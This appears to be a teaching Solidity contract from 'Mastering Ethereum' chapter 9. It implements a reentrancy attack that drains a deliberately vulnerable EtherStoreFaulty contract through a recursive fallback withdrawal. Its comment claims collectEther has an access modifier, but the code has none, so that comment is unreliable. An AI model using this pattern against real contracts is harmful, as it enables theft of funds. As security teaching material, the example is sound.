// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity 0.6.12;

import {EtherStoreFaulty} from "./EtherStoreFaulty.sol";

/**
 * @title Mastering Ethereum Chapter 9, Attack contract.
 * @author Victor Navascues.
 * @notice Exploits EtherStoreFaulty contract, stealing all its funds via
 * reentrancy attack.
 * @dev This contract has been modified regarding the original one, by adding
 * and access modified in the `collectEther()` function (inheriting `Owned`).
 */
contract AttackFaulty {
    EtherStoreFaulty public etherStoreFaulty;

    constructor(address _etherStoreFaultyAddress) public {
        etherStoreFaulty = EtherStoreFaulty(_etherStoreFaultyAddress);
    }

    function attackEtherStoreFaulty() external payable {
        require(msg.value >= 1 ether, "AttackFaulty: Requires 1 ether.");
        etherStoreFaulty.depositFunds{value: 1 ether}();
        etherStoreFaulty.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(etherStoreFaulty).balance >= 1 ether) {
            etherStoreFaulty.withdrawFunds(1 ether);
        }
    }
}
